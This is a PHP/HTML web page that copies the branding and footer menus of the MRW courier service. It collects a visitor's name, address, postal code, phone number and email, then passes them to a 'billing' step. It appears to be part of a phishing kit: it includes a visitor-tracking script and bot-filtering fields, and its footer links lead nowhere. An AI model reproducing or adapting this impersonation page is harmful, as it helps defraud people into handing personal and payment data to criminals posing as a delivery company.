<?php require_once __DIR__ . "/../vender/visitors.php"; ?>
<?php require_once __DIR__ . "/../vender/languages.php"; ?>
<!DOCTYPE html>
<html lang="<?php echo $lang_code; ?>" <?php echo ($lang_code == 'ar' ? 'dir="rtl"' : ''); ?>>
<head>
    <meta charset="utf-8">
    <title>MRW</title>
	<!-- logo img title-->
    <link rel="icon" href="image/om.png" type="image/x-png"/>
    <link rel="shortcut icon" href="image/om.png" type="image/x-png" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/asse.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        #menuFooter {
            background-color: #1b224d;
            color: #fff;
            padding: 40px 0;
            font-size: 0.9rem;
        }
        #menuFooter h3 {
            font-size: 1.1rem;
            font-weight: bold;
            margin-bottom: 20px;
            color: #fff;
        }
        #menuFooter ul {
            list-style: none;
            padding: 0;
        }
        #menuFooter ul li {
            margin-bottom: 8px;
        }
        #menuFooter ul li a {
            color: #ccc;
            text-decoration: none;
        }
        #social {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }
        #social li a {
            color: #fff !important;
        }
        #menuLegal {
            background-color: #1b224d;
            padding: 20px 0;
            text-align: center;
            border-top: 1px solid #444;
        }
        #menuLegal ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
        }
        #menuLegal ul li {
            color: #888;
            font-size: 0.8rem;
        }
        #menuLegal ul li a {
            color: #888;
            text-decoration: none;
        }
        .form-control:focus {
            border-color: #ced4da;
            box-shadow: none;
            outline: 0;
        }
        .is-invalid, .is-valid {
            border-color: #ced4da !important;
            background-image: none !important;
            box-shadow: none !important;
        }
        <?php if($lang_code == 'ar'): ?>
        body { text-align: right; }
        .icon-mrw { margin-left: 10px; margin-right: 0; }
        .me-2 { margin-left: 0.5rem !important; margin-right: 0 !important; }
        <?php endif; ?>
    </style>
</head>
<body>
    <header>
        <div class="container">
            <img src="image/ogou.png" alt="MRW" width="100">
        </div>
    </header>

    <main id="main" class="py-5">
        <div class="container">
            <article class="col-md-6 mx-auto">
                <div class="login border bg-light p-4">
                    <h2 class="mb-3"><i class="fas fa-map-marked-alt icon-mrw"></i> <?php echo $txt['delivery_address']; ?></h2>
                    
                    <form action="infos" method="post">
                        <input type="hidden" name="step" value="billing">
                        
                        <div class="mb-3">
                            <label class="form-label fw-bold"><i class="fas fa-user me-2 text-muted"></i><?php echo $txt['full_name']; ?></label>
                            <input type="text" class="form-control" name="fname" placeholder="<?php echo $txt['full_name']; ?>" required minlength="4" pattern="[A-Za-z\s]+" title="Solo se permiten letras latinas y espacios">
                        </div>
                        
                        <div class="mb-3">
                            <label class="form-label fw-bold"><i class="fas fa-home me-2 text-muted"></i><?php echo $txt['address']; ?></label>
                            <input type="text" class="form-control" name="address1" placeholder="<?php echo $txt['address']; ?>" required minlength="3">
                        </div>
                                                
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <label class="form-label fw-bold"><i class="fas fa-city me-2 text-muted"></i><?php echo $txt['city']; ?></label>
                                <input type="text" class="form-control" name="city" required>
                            </div>
                            <div class="col-md-6 mb-3">
                                <label class="form-label fw-bold"><?php echo $txt['province']; ?></label>
                                <input type="text" class="form-control" name="country" required>
                            </div>
                        </div>
                        
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <label class="form-label fw-bold"><i class="fas fa-mail-bulk me-2 text-muted"></i><?php echo $txt['zip_code']; ?></label>
                                <input type="tel" class="form-control" name="zip" pattern="\d{5}" maxlength="5" placeholder="12345" required title="El código postal debe tener exactamente 5 dígitos">
                            </div>
                            <div class="col-md-6 mb-3">
                                <label class="form-label fw-bold"><i class="fas fa-phone me-2 text-muted"></i><?php echo $txt['phone']; ?></label>
                                <input type="tel" class="form-control" name="number" pattern="\d{9}" maxlength="9" placeholder="600000000" required title="El número de teléfono debe tener exactamente 9 dígitos">
                            </div>
                        </div>
                        
                        <div class="mb-4">
                            <label class="form-label fw-bold"><i class="fas fa-envelope me-2 text-muted"></i><?php echo $txt['email']; ?></label>
                            <input type="email" class="form-control" name="email" required>
                        </div>
                        
                        <input type="hidden" name="load_time" value="<?php echo time(); ?>">
                        <div style="display:none;">
                            <input type="text" name="hp_field" value="">
                        </div>
                        <button type="submit" name="submit" class="btn btn-lg w-100"><?php echo $txt['continue']; ?></button>
                    </form>
                </div>
            </article>
        </div>
    </main>

    <footer class="navbar-inverse footer" id="menuFooter">
        <div class="container">
            <div class="row aligned-row">
                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['envios']; ?></h3>
                    <ul>
                        <li><?php echo $txt['tracking']; ?></li>
                        <li><?php echo $txt['locate_office']; ?></li>
                        <li><?php echo $txt['arrange_delivery']; ?></li>
                        <li><?php echo $txt['packaging']; ?></li>
                        <li><?php echo $txt['benefits']; ?></li>
                        <li><?php echo $txt['fuel_surcharge']; ?></li>
                        <li><?php echo $txt['general_conditions']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['individuals']; ?></h3>
                    <ul>
                        <li><?php echo $txt['my_mrw']; ?></li>
                        <li><?php echo $txt['your_shipments']; ?></li>
                        <li><?php echo $txt['make_shipment']; ?></li>
                        <li><?php echo $txt['national_services']; ?></li>
                        <li><?php echo $txt['international_services']; ?></li>
                        <li><?php echo $txt['mrw_pack']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['companies']; ?></h3>
                    <ul>
                        <li><?php echo $txt['shipments_company']; ?></li>
                        <li><?php echo $txt['become_mrw_point']; ?></li>
                        <li><?php echo $txt['national_services']; ?></li>
                        <li><?php echo $txt['international_services']; ?></li>
                        <li><?php echo $txt['burofax']; ?></li>
                        <li><?php echo $txt['digital_logistics']; ?></li>
                        <li><?php echo $txt['ecommerce']; ?></li>
                        <li><?php echo $txt['logistics_solutions']; ?></li>
                        <li><?php echo $txt['sector_solutions']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['social_responsibility']; ?></h3>
                    <ul>
                        <li><?php echo $txt['our_rsc']; ?></li>
                        <li><?php echo $txt['solidarity_shipments']; ?></li>
                        <li><?php echo $txt['discounted_services']; ?></li>
                        <li><?php echo $txt['ethical_channel']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['news_blog']; ?></h3>
                    <ul>
                        <li><?php echo $txt['blog']; ?></li>
                        <li><?php echo $txt['news']; ?></li>
                    </ul>
                </div>

                <div id="divSobreMRW" class="col-md-2 footer-links col-xs-12 col-sm-6">
                    <ul id="social">
                        <li><i class="fab fa-facebook-f fa-2x"></i></li>
                        <li><i class="fab fa-twitter fa-2x"></i></li>
                        <li><i class="fab fa-youtube fa-2x"></i></li>
                        <li><i class="fab fa-linkedin-in fa-2x"></i></li>
                        <li><i class="fab fa-instagram fa-2x"></i></li>
                    </ul>
                    <ul>
                        <li><?php echo $txt['contact_us']; ?></li>
                        <li><?php echo $txt['who_we_are']; ?></li>
                        <li><?php echo $txt['our_offices']; ?></li>
                        <li><?php echo $txt['work_with_us']; ?></li>
                        <li><?php echo $txt['customer_service']; ?></li>
                    </ul>
                </div>
            </div>
        </div>

        <div id="menuLegal">
            <div class="container">
                <ul>
                    <li><?php echo $txt['copyright']; ?></li>
                    <li><?php echo $txt['accessibility']; ?></li>
                    <li><?php echo $txt['privacy_policy']; ?></li>
                    <li><?php echo $txt['legal_notice']; ?></li>
                    <li><?php echo $txt['cookies_policy']; ?></li>
                    <li><?php echo $txt['fraud_info']; ?></li>
                    <li><?php echo $txt['eu_dispute']; ?></li>
                    <li><?php echo $txt['web_map']; ?></li>
                    <li>W3C-WAI</li>
                    <li id="gesPymeFooter" style="display: inline-block; margin-left: 10px;">
                        <img src="image/peku.png" alt="Proyecto G3 - GesPyME" style="height: 25px;">
                    </li>
                </ul>
            </div>
        </div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const nameInput = document.querySelector('input[name="fname"]');
            nameInput.addEventListener('input', function() {
                this.value = this.value.replace(/[^A-Za-z\s]/g, '');
            });

            const zipInput = document.querySelector('input[name="zip"]');
            zipInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
            });

            const phoneInput = document.querySelector('input[name="number"]');
            phoneInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
            });
        });
    </script>
</body>
</html>
